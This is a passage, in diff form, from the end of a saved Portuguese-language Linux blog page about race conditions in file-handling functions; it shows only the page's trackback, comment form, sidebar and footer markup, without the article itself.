+		<A id="trackbacktab" class="tab" href="javascript:void(0);" onclick="MGJS.switchTab(&#39;thetrackbacks&#39;, &#39;thecomments,commentnavi&#39;, &#39;trackbacktab&#39;, &#39;curtab&#39;, &#39;commenttab&#39;, &#39;tab&#39;);">Trackbacks (1)</A>
+				<SPAN class="addcomment"><A href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/#respond">Escrever um comentário</A></SPAN>
+				<SPAN class="addtrackback"><A href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/trackback/">Trackback</A></SPAN>
+		<DIV class="fixed"></DIV>
+</DIV>
+
+<DIV id="commentlist">
+	<!-- comments START -->
+	<OL id="thecomments">
+			<LI class="messagebox">
+			Ainda sem nenhum comentário.		</LI>
+		</OL>
+	<!-- comments END -->
+
+
+	<!-- trackbacks START -->
+			<OL id="thetrackbacks">
+												<LI class="trackback">
+						<DIV class="date">
+							23, Fevereiro, 2010 a 19:09							 | <A href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/#comment-1011">#1</A>
+						</DIV>
+						<DIV class="act">
+													</DIV>
+						<DIV class="fixed"></DIV>
+						<DIV class="title">
+							<A href="http://www.via6.com/topico.php?tid=424560">
+								VonNaturAustreVe via Rec6							</A>
+						</DIV>
+					</LI>
+				
+					</OL>
+		<DIV class="fixed"></DIV>
+	<!-- trackbacks END -->
+</DIV>
+
+</DIV>
+
+	<FORM action="http://0fx66.com/blog/wp-comments-post.php" method="post" id="commentform">
+	<DIV id="respond">
+
+					
+			<DIV id="author_info">
+				<DIV class="row">
+					<INPUT type="text" name="author" id="author" class="textfield" value="" size="24" tabindex="1">
+					<LABEL for="author" class="small">Nome (obrigatório)</LABEL>
+				</DIV>
+				<DIV class="row">
+					<INPUT type="text" name="email" id="email" class="textfield" value="" size="24" tabindex="2">
+					<LABEL for="email" class="small">E-Mail (não será publicado) (obrigatório)</LABEL>
+				</DIV>
+				<DIV class="row">
+					<INPUT type="text" name="url" id="url" class="textfield" value="" size="24" tabindex="3">
+					<LABEL for="url" class="small">Website</LABEL>
+				</DIV>
+			</DIV>
+
+			
+		
+		<!-- comment input -->
+		<DIV class="row">
+			<TEXTAREA name="comment" id="comment" tabindex="4" rows="8" cols="50"></TEXTAREA>
+		</DIV>
+
+		<!-- comment submit and rss -->
+		<DIV id="submitbox">
+			<A class="feed" href="http://0fx66.com/blog/comments/feed/">Subscrever o feed de comentários</A>
+			<DIV class="submitbutton">
+				<INPUT name="submit" type="submit" id="submit" class="button" tabindex="5" value="Enviar coment&aacute;rio">
+			</DIV>
+						<INPUT type="hidden" name="comment_post_ID" value="2654">
+			<DIV class="fixed"></DIV>
+		</DIV>
+
+	</DIV>
+		</FORM>
+
+	
+
+	<DIV id="postnavi">
+		<SPAN class="prev"><A href="http://0fx66.com/blog/linux/entrevista-com-patrick-volkerding/" rel="next">Entrevista com Patrick Volkerding</A></SPAN>
+		<SPAN class="next"><A href="http://0fx66.com/blog/internet/leis-de-controle-da-internet-protecao-ou-censura/" rel="prev">Leis de controle da Internet: proteção ou censura?</A></SPAN>
+		<DIV class="fixed"></DIV>
+	</DIV>
+
+
+	</DIV>
+	<!-- main END -->
+
+	
+<!-- sidebar START -->
+<DIV id="sidebar">
+
+<!-- sidebar north START -->
+<DIV id="northsidebar" class="sidebar">
+
+	<!-- feeds -->
+	<DIV class="widget widget_feeds">
+		<DIV class="content">
+			<DIV id="subscribe">
+				<A rel="external nofollow" id="feedrss" title="Subscrever este blog..." href="http://feeds2.feedburner.com/0fx66"><ABBR title="Really Simple Syndication">RSS</ABBR></A>
+							</DIV>
+							<A id="followme" title="Follow me!" href="http://twitter.com/__von/">Twitter</A>
+						<DIV class="fixed"></DIV>
+		</DIV>
+	</DIV>
+
+	<!-- showcase -->
+			<DIV class="widget">
+							<H3>Publicidade:</H3>
+						<DIV class="content">
+				<SCRIPT type="text/javascript"><!--
+google_ad_client = "pub-6883104526510342";
+/* 250x250, criado 12/04/10 */
+google_ad_slot = "2545464637";
+google_ad_width = 250;
+google_ad_height = 250;
+//-->
+</SCRIPT>
+<SCRIPT type="text/javascript" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/show_ads.js">
+</SCRIPT><SCRIPT src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/test_domain.js"></SCRIPT><SCRIPT>google_protectAndRun("ads_core.google_render_ad", google_handleError, google_render_ad);</SCRIPT><IFRAME name="google_ads_frame" width="250" height="250" frameborder="0" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/ads.html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no"></IFRAME>			</DIV>
+		</DIV>
+	
+<DIV id="global-translator" class="widget widget_global_translator"><H3>Translator</H3>
+<!--FLAG_BAR_BEGIN--><DIV id="translation_bar"><MAP id="gltr_flags_map" name="gltr_flags_map"><AREA shape="rect" coords="0,0,16,11" href="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/O perigo das funções que manipulam arquivos  Race condition   0fx66.html" id="flag_pt" title="Portuguese"><AREA shape="rect" coords="20,0,36,11" href="http://0fx66.com/blog/en/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/" id="flag_en" title="English"><AREA shape="rect" coords="40,0,56,11" href="http://0fx66.com/blog/es/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/" id="flag_es" title="Spanish"></MAP><IMG style="border:0px;" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/gltr_image_map.png" usemap="#gltr_flags_map"></DIV><DIV id="transl_sign"></DIV><!--FLAG_BAR_END-->
+</DIV><DIV id="categories-2" class="widget widget_categories"><H3>Categorias</H3>		<UL>
+	<LI class="cat-item cat-item-70"><A href="http://0fx66.com/blog/category/eventos/" title="Categoria dedica a divulga&ccedil;&atilde;o de eventos sobre programa&ccedil;&atilde;o,tecnologia,Linux,redes e outros temas abordados pelo blog.">Eventos</A> (35)
+</LI>
+	<LI class="cat-item cat-item-25"><A href="http://0fx66.com/blog/category/hardware/" title="Categoria destinada a postagem sobre Hardware,eletr&ocirc;nica,eletricidade e outros temas relacionados.">Hardware</A> (8)
+</LI>
+	<LI class="cat-item cat-item-20"><A href="http://0fx66.com/blog/category/humor/" title="Categoria destinada a posts de humor, engra&ccedil;ados, hil&aacute;rios e bem humorados.">Humor</A> (15)
+</LI>
+	<LI class="cat-item cat-item-18"><A href="http://0fx66.com/blog/category/internet/" title="Categoria destinada a postagem de temas relacionados a internet em geral, como novidades, novos servi&ccedil;os, dicas de sites.">Internet</A> (18)
+</LI>
+	<LI class="cat-item cat-item-2"><A href="http://0fx66.com/blog/category/links/" title="Categoria usada na publica&ccedil;&atilde;o de dicas de links relacionados a tem&aacute;tica usada pelo blog.">Links</A> (3)
+</LI>
+	<LI class="cat-item cat-item-7"><A href="http://0fx66.com/blog/category/linux/" title="Categoria principal do blog, destinada a postagens sobre Linux.">Linux</A> (70)
+</LI>
+	<LI class="cat-item cat-item-206"><A href="http://0fx66.com/blog/category/musica/" title="Categoria utilizada na publica&ccedil;&atilde;o de artigos, dicas, m&uacute;sicas, clipes relacionados a m&uacute;sicas.">Música</A> (6)
+</LI>
+	<LI class="cat-item cat-item-19"><A href="http://0fx66.com/blog/category/noticias/" title="Categoria destinada a postagem de noticias sobre analise do autor do blog.">Notícias</A> (26)
+</LI>
+	<LI class="cat-item cat-item-1"><A href="http://0fx66.com/blog/category/outros/" title="Categoria destinada a assuntos que n&atilde;o possuem categoria especifica.">Outros</A> (34)
+</LI>
+	<LI class="cat-item cat-item-75"><A href="http://0fx66.com/blog/category/pentest/" title="Categoria destinada a postagem sobres pentests, seguran&ccedil;a digital, hackers, t&eacute;cnicas de invas&atilde;o e ideologias hackers.">Pentest</A> (17)
+</LI>
+	<LI class="cat-item cat-item-31"><A href="http://0fx66.com/blog/category/programacao/" title="Categoria destinada a postagem sobre programa&ccedil;&atilde;o em diversas linguagens.">Programação</A> (38)
+</LI>
+	<LI class="cat-item cat-item-3"><A href="http://0fx66.com/blog/category/redes/" title="Categoria destinada a postagem de temas sobre redes de computadores.">Redes</A> (10)
+</LI>
+		</UL>
+</DIV><DIV id="linkcat-2" class="widget widget_links"><H3>Links</H3>
+	<UL class="xoxo blogroll">
+<LI><A href="http://br-linux.org/" rel="contact" target="_blank">BR-Linux</A></LI>
+<LI><A href="http://www.guiadohardware.net/termos/" title="Dicionario de Termos T&eacute;cnicos " target="_blank">Dicionario de Termos Técnicos</A></LI>
+<LI><A href="http://www.efetividade.net/" title="Um pouco mais sobre efic&aacute;cia, efici&ecirc;ncia, efetividade e produtividade." target="_blank">Efetividade</A></LI>
+<LI><A href="http://estudiolivre.org/" title="O Est&uacute;dio Livre &eacute; um conceito de ambiente colaborativo em constante desenvolvimento que tem por objetivo a forma&ccedil;&atilde;o de espa&ccedil;os reais e virtuais que estimulem e permitam a produ&ccedil;&atilde;o, a distribui&ccedil;&atilde;o e o desenvolvimento de m&iacute;dias livres.">Estudio Livre</A></LI>
+<LI><A href="http://explicacaodanet.blogspot.com/" rel="me" title="Outro blog onde escreve dicas sobre linux." target="_blank">Explicação da Net</A></LI>
+<LI><A href="http://focalinux.cipsga.org.br/" rel="contact" target="_blank">Guia Foca Linux</A></LI>
+<LI><A href="http://www.infowester.com/" rel="acquaintance" target="_blank">InfoWester</A></LI>
+<LI><A href="http://www.jogos4linux.com/" title="Jogos para linux? Aqui voc&ecirc; encontra =D" target="_blank">Jogos4linux</A></LI>
+<LI><A href="http://www.securityfocus.com/" title="Excelente refer&ecirc;ncia de Bugtrack, vulnerabilidades e artigos.">SecurityFocus</A></LI>
+<LI><A href="http://0fx66.com/files/seguranca-no-slackaware.html" rel="me">Segurança no slackaware</A></LI>
+<LI><A href="http://www.slackware.com/" title=" The Slackware Linux Project " target="_blank">Slackware</A></LI>
+<LI><A href="http://www.thebugmagazine.org/" target="_blank">The Bug Magazine</A></LI>
+<LI><A href="http://www.vivaolinux.com.br/" rel="contact colleague" target="_blank">Viva O Linux</A></LI>
+
+	</UL>
+</DIV>
+		<DIV id="recent-comments-3" class="widget widget_recent_comments">			<H3>Comentários Recentes</H3>			<UL id="recentcomments"><LI class="recentcomments"><A href="http://brunobarbosa.com.br/" rel="external nofollow" class="url">Bruno Barbosa</A> em <A href="http://0fx66.com/blog/links/links-da-semana002/comment-page-1/#comment-1415">Links da semana[002]</A></LI><LI class="recentcomments"><A href="http://www.via6.com/topico.php?tid=481231" rel="external nofollow" class="url">VonNaturAustreVe via Rec6</A> em <A href="http://0fx66.com/blog/links/links-da-semana002/comment-page-1/#comment-1414">Links da semana[002]</A></LI><LI class="recentcomments"><A href="http://www.via6.com/topico.php?tid=480854" rel="external nofollow" class="url">VonNaturAustreVe via Rec6</A> em <A href="http://0fx66.com/blog/eventos/encontro-mensal-do-dfjug-quarta-28-abril-%e2%80%93-java-em-servidores-livres-2/comment-page-1/#comment-1413">Encontro mensal do DFJUG Quarta 28 Abril – Java em servidores livres</A></LI><LI class="recentcomments"><A href="http://www.via6.com/topico.php?tid=479674" rel="external nofollow" class="url">VonNaturAustreVe via Rec6</A> em <A href="http://0fx66.com/blog/linux/error-2002-cant-connect-to-local-mysql-server-como-resolver/comment-page-1/#comment-1412">ERROR 2002: Can’t connect to local MySQL server como resolver?</A></LI><LI class="recentcomments"><A href="http://0fx66.com/" rel="external nofollow" class="url">VonNaturAustreVe</A> em <A href="http://0fx66.com/blog/programacao/programacao-em-pascal/comment-page-1/#comment-1410">Programação em Pascal</A></LI><LI class="recentcomments"><A href="http://www.via6.com/topico.php?tid=478629" rel="external nofollow" class="url">VonNaturAustreVe via Rec6</A> em <A href="http://0fx66.com/blog/musica/musica-para-animar006/comment-page-1/#comment-1409">Música para animar[006]</A></LI><LI class="recentcomments">fabio em <A href="http://0fx66.com/blog/programacao/programacao-em-pascal/comment-page-1/#comment-1408">Programação em Pascal</A></LI></UL>
+		</DIV><DIV id="archives-3" class="widget widget_archive"><H3>Arquivo</H3>		<UL>
+			<LI><A href="http://0fx66.com/blog/2010/04/" title="Abril 2010">Abril 2010</A>&nbsp;(27)</LI>
+	<LI><A href="http://0fx66.com/blog/2010/03/" title="Mar&ccedil;o 2010">Março 2010</A>&nbsp;(21)</LI>
+	<LI><A href="http://0fx66.com/blog/2010/02/" title="Fevereiro 2010">Fevereiro 2010</A>&nbsp;(29)</LI>
+	<LI><A href="http://0fx66.com/blog/2010/01/" title="Janeiro 2010">Janeiro 2010</A>&nbsp;(23)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/12/" title="Dezembro 2009">Dezembro 2009</A>&nbsp;(15)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/11/" title="Novembro 2009">Novembro 2009</A>&nbsp;(14)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/10/" title="Outubro 2009">Outubro 2009</A>&nbsp;(21)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/09/" title="Setembro 2009">Setembro 2009</A>&nbsp;(17)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/08/" title="Agosto 2009">Agosto 2009</A>&nbsp;(20)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/07/" title="Julho 2009">Julho 2009</A>&nbsp;(8)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/06/" title="Junho 2009">Junho 2009</A>&nbsp;(20)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/05/" title="Maio 2009">Maio 2009</A>&nbsp;(20)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/04/" title="Abril 2009">Abril 2009</A>&nbsp;(8)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/03/" title="Mar&ccedil;o 2009">Março 2009</A>&nbsp;(5)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/02/" title="Fevereiro 2009">Fevereiro 2009</A>&nbsp;(17)</LI>
+	<LI><A href="http://0fx66.com/blog/2009/01/" title="Janeiro 2009">Janeiro 2009</A>&nbsp;(10)</LI>
+		</UL>
+</DIV></DIV>
+<!-- sidebar north END -->
+<DIV id="centersidebar">
+
+	<!-- sidebar east START -->
+	<DIV id="eastsidebar" class="sidebar">
+			</DIV>
+	<!-- sidebar east END -->
+	<!-- sidebar west START -->
+	<DIV id="westsidebar" class="sidebar">
+	
+		</DIV>
+	<!-- sidebar west END -->
+	<DIV class="fixed"></DIV>
+</DIV>
+<!-- sidebar south START -->
+<DIV id="southsidebar" class="sidebar">
+</DIV>
+<!-- sidebar south END -->
+
+</DIV>
+<!-- sidebar END -->
+	<DIV class="fixed"></DIV>
+</DIV>
+<!-- content END -->
+
+<!-- footer START -->
+<DIV id="footer">
+	<A id="gotop" href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/#" onclick="MGJS.goTop();return false;">Topo</A>
+	<A id="powered" href="http://wordpress.org/">WordPress</A>
+	<DIV id="copyright">
+		Copyright © 2009-2010 0fx66	</DIV>
+	<DIV id="themeinfo">
+		Tema criado por <A href="http://www.neoease.com/">NeoEase</A>. Validar <A href="http://validator.w3.org/check?uri=referer">XHTML 1.1</A> e <A href="http://jigsaw.w3.org/css-validator/check/referer?profile=css3">CSS 3</A>.	</DIV>
+</DIV>
+<!-- footer END -->
+
+</DIV>
+<!-- container END -->
+</DIV>
+<!-- wrap END -->
+
+<SCRIPT type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</SCRIPT><SCRIPT src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/ga.js" type="text/javascript"></SCRIPT>
+<SCRIPT type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-4238164-3");
+pageTracker._trackPageview();
+} catch(err) {}</SCRIPT>
+
+
+
+
+<!-- Dynamic page generated in 0.509 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2010-04-24 06:54:50 -->
+</BODY></HTML>
